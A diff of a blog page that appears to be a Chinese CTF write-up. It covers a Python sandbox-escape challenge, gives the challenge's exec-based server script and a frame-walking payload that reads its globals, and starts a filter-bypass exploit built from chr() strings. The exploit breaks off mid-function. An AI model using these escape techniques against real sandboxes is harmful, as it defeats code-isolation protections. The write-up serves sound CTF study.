+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/local/bin/python3  </span>
+</span></span><span class="line"><span class="cl"><span class="c1"># First Line of docker file -&gt; FROM ubuntu:23.04  </span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>  
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>  
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>  
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">tempfile</span> <span class="kn">import</span> <span class="n">TemporaryDirectory</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="n">WELCOME</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">&#39;&#39;&#39;  
+</span></span></span><span class="line"><span class="cl"><span class="s1">  
+</span></span></span><span class="line"><span class="cl"><span class="s1"> __          ___    _       _______    _____          _   _   _____    _____     __     __  
+</span></span></span><span class="line"><span class="cl"><span class="s1"> \ \        / / |  | |   /\|__   __|  / ____|   /\   | \ | | |_   _|  / ____|  /\\ \   / /  
+</span></span></span><span class="line"><span class="cl"><span class="s1">  \ \  /\  / /| |__| |  /  \  | |    | |       /  \  |  \| |   | |   | (___   /  \\ \_/ /   
+</span></span></span><span class="line"><span class="cl"><span class="s1">   \ \/  \/ / |  __  | / /\ \ | |    | |      / /\ \ | . ` |   | |    \___ \ / /\ \\   /    
+</span></span></span><span class="line"><span class="cl"><span class="s1">    \  /\  /  | |  | |/ ____ \| |    | |____ / ____ \| |\  |  _| |_   ____) / ____ \| |     
+</span></span></span><span class="line"><span class="cl"><span class="s1">     \/  \/   |_|  |_/_/    \_\_|     \_____/_/    \_\_| \_| |_____| |_____/_/    \_\_|     
+</span></span></span><span class="line"><span class="cl"><span class="s1">                                                                                            
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="n">basecode</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;  
+</span></span></span><span class="line"><span class="cl"><span class="s1"># safebuiltins_dict={x:y for x,y in dict(vars(__builtins__)).items() if x[0] not in &#34;_-abcdefghijklmnopqrstuvwxyz&#34;}  
+</span></span></span><span class="line"><span class="cl"><span class="s1"># del __builtins__  
+</span></span></span><span class="line"><span class="cl"><span class="s1"># try:exec(code,safebuiltins_dict,</span><span class="si">{}</span><span class="s1">)  
+</span></span></span><span class="line"><span class="cl"><span class="s1"># except:pass  
+</span></span></span><span class="line"><span class="cl"><span class="s1">exec(code)  
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">workdir</span><span class="p">):</span>  
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Make `input equals output` but with some rules!&#34;</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;1. Not allow to use some special chars -&gt; like unicode&#34;</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;2. Code length less than 666&#34;</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;3. Make sure &#39;what.can.i.say&#39; in your code that makes Kobe like you!&#34;</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;4. Pls input your code which end with &lt;EOF&gt;&#34;</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Good luck!&#34;</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">chdir</span><span class="p">(</span><span class="n">workdir</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">mkdir</span><span class="p">(</span><span class="s2">&#34;runsbox&#34;</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    <span class="n">code</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>  
+</span></span><span class="line"><span class="cl">    <span class="n">tmp_input</span> <span class="o">=</span> <span class="p">[]</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="n">x</span> <span class="o">:=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;&gt;&gt;&gt; &#34;</span><span class="p">))</span> <span class="o">!=</span> <span class="s2">&#34;&lt;EOF&gt;&#34;</span><span class="p">:</span>  
+</span></span><span class="line"><span class="cl">        <span class="n">tmp_input</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">    <span class="n">code</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">m</span> <span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="n">tmp_input</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    <span class="c1"># assert 0 &lt; len(code) &lt; 666, &#34;Boy your code is too long!!!!!&#34;  </span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># assert all(i not in code for i in list(&#34;&#39;\&#34;_{}#&#34;)), &#34;I don&#39;t like those chars...&#34;  </span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># assert &#34;import&#34; not in code,&#34;Boy, this isn&#39;t funny!&#34;  </span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># assert &#34;what.can.i.say&#34; in code, &#34;Mamba out!&#34;  </span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># assert all(10 &lt;= ord(c) &lt;= 127 for c in code), &#34;pls using ascii code boy!&#34;  </span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>  
+</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;runbox.py&#34;</span><span class="p">,</span> <span class="s2">&#34;w+&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;&#34;&#34;#!/usr/local/bin/python3  
+</span></span></span><span class="line"><span class="cl"><span class="s2"></span><span class="si">{</span><span class="n">code</span> <span class="si">= }</span><span class="s2">  
+</span></span></span><span class="line"><span class="cl"><span class="s2"></span><span class="si">{</span><span class="n">basecode</span><span class="si">}</span><span class="s2">  
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">        <span class="n">runsbx_handle</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>  
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;/usr/bin/python3 runbox.py&#34;</span><span class="p">,</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span><span class="p">,</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>  
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">stderr</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&#34;run sandbox error!</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">        <span class="n">os</span><span class="o">.</span><span class="n">_exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span>  
+</span></span><span class="line"><span class="cl">        <span class="nb">len</span><span class="p">(</span><span class="n">runsbx_handle</span><span class="o">.</span><span class="n">stdout</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">        <span class="ow">and</span> <span class="nb">len</span><span class="p">(</span><span class="n">runsbx_handle</span><span class="o">.</span><span class="n">stderr</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">        <span class="ow">and</span> <span class="n">runsbx_handle</span><span class="o">.</span><span class="n">stdout</span> <span class="o">==</span> <span class="n">runsbx_handle</span><span class="o">.</span><span class="n">stderr</span> <span class="o">==</span> <span class="n">code</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">):</span>  
+</span></span><span class="line"><span class="cl">        <span class="c1"># with open(&#34;/fake_local_flag_path_but_real_into_remote_xxxxxxxxxxxx&#34;) as f:  </span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#     sys.stdout.write(f.read())  </span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;bypass&#34;</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>  
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">stderr</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&#34;Man what can i say?</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>  
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">WELCOME</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">TemporaryDirectory</span><span class="p">()</span> <span class="k">as</span> <span class="n">workdir</span><span class="p">:</span>  
+</span></span><span class="line"><span class="cl">        <span class="n">main</span><span class="p">(</span><span class="n">workdir</span><span class="p">)</span>  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>参考文章<br>
+<a href="https://hust-l3hsec.feishu.cn/docx/MZ8SdwSoPo3cBTxOxbGcuUBun4c"target="_blank" rel="external nofollow noopener noreferrer">https://hust-l3hsec.feishu.cn/docx/MZ8SdwSoPo3cBTxOxbGcuUBun4c</a><br>
+<a href="https://xz.aliyun.com/t/13635"target="_blank" rel="external nofollow noopener noreferrer">https://xz.aliyun.com/t/13635</a></p>
+<div class="highlight" id="id-6"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a=(a.gi_frame.f_back.f_back for i in [1])  
+</span></span><span class="line"><span class="cl">a=[x for x in a][0]  
+</span></span><span class="line"><span class="cl">globals=a.f_back.f_globals  
+</span></span><span class="line"><span class="cl">code = globals[&#39;code&#39;]  
+</span></span><span class="line"><span class="cl">exec(&#39;__import__(&#34;sys&#34;).stdout.write(code)&#39;)  
+</span></span><span class="line"><span class="cl">exec(&#39;__import__(&#34;sys&#34;).stderr.write(code)&#39;)  </span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406021531645.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406021531645.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406021531645.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406021531645.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406021531645.png" data-alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406021531645.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/>
+接下来想办法绕过如下两处代码</p>
+<div class="highlight" id="id-7"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">safebuiltins_dict</span><span class="o">=</span><span class="p">{</span><span class="n">x</span><span class="p">:</span><span class="n">y</span> <span class="k">for</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span> <span class="ow">in</span> <span class="nb">dict</span><span class="p">(</span><span class="nb">vars</span><span class="p">(</span><span class="n">__builtins__</span><span class="p">))</span><span class="o">.</span><span class="n">items</span><span class="p">()</span> <span class="k">if</span> <span class="n">x</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">not</span> <span class="ow">in</span> <span class="s2">&#34;_-abcdefghijklmnopqrstuvwxyz&#34;</span><span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="k">del</span> <span class="n">__builtins__</span>  
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span><span class="n">exec</span><span class="p">(</span><span class="n">code</span><span class="p">,</span><span class="n">safebuiltins_dict</span><span class="p">,{})</span>  
+</span></span><span class="line"><span class="cl"><span class="k">except</span><span class="p">:</span><span class="k">pass</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="mi">0</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">code</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">666</span><span class="p">,</span> <span class="s2">&#34;Boy your code is too long!!!!!&#34;</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="nb">all</span><span class="p">(</span><span class="n">i</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">code</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">list</span><span class="p">(</span><span class="s2">&#34;&#39;</span><span class="se">\&#34;</span><span class="s2">_</span><span class="si">{}</span><span class="s2">#&#34;</span><span class="p">)),</span> <span class="s2">&#34;I don&#39;t like those chars...&#34;</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="s2">&#34;import&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">code</span><span class="p">,</span><span class="s2">&#34;Boy, this isn&#39;t funny!&#34;</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="s2">&#34;what.can.i.say&#34;</span> <span class="ow">in</span> <span class="n">code</span><span class="p">,</span> <span class="s2">&#34;Mamba out!&#34;</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="nb">all</span><span class="p">(</span><span class="mi">10</span> <span class="o">&lt;=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">127</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">code</span><span class="p">),</span> <span class="s2">&#34;pls using ascii code boy!&#34;</span>  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>先看第一处</p>
+<div class="highlight" id="id-8"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">safebuiltins_dict</span><span class="o">=</span><span class="p">{</span><span class="n">x</span><span class="p">:</span><span class="n">y</span> <span class="k">for</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span> <span class="ow">in</span> <span class="nb">dict</span><span class="p">(</span><span class="nb">vars</span><span class="p">(</span><span class="n">__builtins__</span><span class="p">))</span><span class="o">.</span><span class="n">items</span><span class="p">()</span> <span class="k">if</span> <span class="n">x</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">not</span> <span class="ow">in</span> <span class="s2">&#34;_-abcdefghijklmnopqrstuvwxyz&#34;</span><span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="k">del</span> <span class="n">__builtins__</span>  
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span><span class="n">exec</span><span class="p">(</span><span class="n">code</span><span class="p">,</span><span class="n">safebuiltins_dict</span><span class="p">,{})</span>  
+</span></span><span class="line"><span class="cl"><span class="k">except</span><span class="p">:</span><span class="k">pass</span>  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个过滤大概意思就是删除了<code>__builtins__</code>，但是保留了一些函数<br>
+第二处</p>
+<div class="highlight" id="id-9"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="k">assert</span> <span class="mi">0</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">code</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">666</span><span class="p">,</span> <span class="s2">&#34;Boy your code is too long!!!!!&#34;</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="nb">all</span><span class="p">(</span><span class="n">i</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">code</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">list</span><span class="p">(</span><span class="s2">&#34;&#39;</span><span class="se">\&#34;</span><span class="s2">_</span><span class="si">{}</span><span class="s2">#&#34;</span><span class="p">)),</span> <span class="s2">&#34;I don&#39;t like those chars...&#34;</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="s2">&#34;import&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">code</span><span class="p">,</span><span class="s2">&#34;Boy, this isn&#39;t funny!&#34;</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="s2">&#34;what.can.i.say&#34;</span> <span class="ow">in</span> <span class="n">code</span><span class="p">,</span> <span class="s2">&#34;Mamba out!&#34;</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="nb">all</span><span class="p">(</span><span class="mi">10</span> <span class="o">&lt;=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">127</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">code</span><span class="p">),</span> <span class="s2">&#34;pls using ascii code boy!&#34;</span>  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>限制了code的长度在0-666之前，并且限制了一些特殊字符<code>'\&quot;_{}#</code>，并且ascii码需要在10-127之前，包含<code>what.can.i.say</code><br>
+构造<code>exp</code></p>
+<div class="highlight" id="id-10"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">g</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="mi">103</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">i</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="mi">105</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">k</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="mi">95</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">f</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="mi">102</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="mi">114</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">a</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="mi">97</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">m</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="mi">109</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">e</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="mi">101</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">b</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="mi">98</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">c</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="mi">99</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">l</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="mi">108</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">o</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="mi">111</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="mi">115</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">d</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">k1</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="mi">107</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="mi">112</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">t</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="mi">116</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">t1</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="mi">40</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">t2</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="mi">34</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">t3</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="mi">41</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">y</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="mi">121</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">d1</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="mi">46</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">u</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="mi">117</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">w</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="mi">119</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">G</span><span class="o">=</span><span class="n">g</span><span class="o">+</span><span class="n">i</span><span class="o">+</span><span class="n">k</span><span class="o">+</span><span class="n">f</span><span class="o">+</span><span class="n">r</span><span class="o">+</span><span class="n">a</span><span class="o">+</span><span class="n">m</span><span class="o">+</span><span class="n">e</span>   
+</span></span><span class="line"><span class="cl"><span class="n">F</span><span class="o">=</span><span class="n">f</span><span class="o">+</span><span class="n">k</span><span class="o">+</span><span class="n">b</span><span class="o">+</span><span class="n">a</span><span class="o">+</span><span class="n">c</span><span class="o">+</span><span class="n">k1</span>  
+</span></span><span class="line"><span class="cl"><span class="n">GL</span><span class="o">=</span><span class="n">f</span><span class="o">+</span><span class="n">k</span><span class="o">+</span><span class="n">g</span><span class="o">+</span><span class="n">l</span><span class="o">+</span><span class="n">o</span><span class="o">+</span><span class="n">b</span><span class="o">+</span><span class="n">a</span><span class="o">+</span><span class="n">l</span><span class="o">+</span><span class="n">s</span>  
+</span></span><span class="line"><span class="cl"><span class="n">CO</span><span class="o">=</span><span class="n">c</span><span class="o">+</span><span class="n">o</span><span class="o">+</span><span class="n">d</span><span class="o">+</span><span class="n">e</span>  
+</span></span><span class="line"><span class="cl"><span class="n">i1</span><span class="o">=</span><span class="n">k</span><span class="o">+</span><span class="n">k</span><span class="o">+</span><span class="n">i</span><span class="o">+</span><span class="n">m</span><span class="o">+</span><span class="n">p</span><span class="o">+</span><span class="n">o</span><span class="o">+</span><span class="n">r</span><span class="o">+</span><span class="n">t</span><span class="o">+</span><span class="n">k</span><span class="o">+</span><span class="n">k</span><span class="o">+</span><span class="n">t1</span><span class="o">+</span><span class="n">t2</span><span class="o">+</span><span class="n">s</span><span class="o">+</span><span class="n">y</span><span class="o">+</span><span class="n">s</span><span class="o">+</span><span class="n">t2</span><span class="o">+</span><span class="n">t3</span><span class="o">+</span><span class="n">d1</span><span class="o">+</span><span class="n">s</span><span class="o">+</span><span class="n">t</span><span class="o">+</span><span class="n">d</span>  
+</span></span><span class="line"><span class="cl"><span class="n">u</span><span class="o">=</span><span class="n">o</span><span class="o">+</span><span class="n">u</span><span class="o">+</span><span class="n">t</span>  
+</span></span><span class="line"><span class="cl"><span class="n">i2</span><span class="o">=</span><span class="n">d1</span><span class="o">+</span><span class="n">w</span><span class="o">+</span><span class="n">r</span><span class="o">+</span><span class="n">i</span><span class="o">+</span><span class="n">t</span><span class="o">+</span><span class="n">e</span><span class="o">+</span><span class="n">t1</span><span class="o">+</span><span class="n">a</span><span class="o">+</span><span class="n">t3</span>  
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">=</span><span class="n">e</span><span class="o">+</span><span class="n">r</span><span class="o">+</span><span class="n">r</span>  
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">a</span><span class="p">():</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">G</span><span class="p">,</span><span class="n">F</span><span class="p">,</span><span class="n">GL</span><span class="p">,</span><span class="n">CO</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">b</span><span class="p">():</span>  
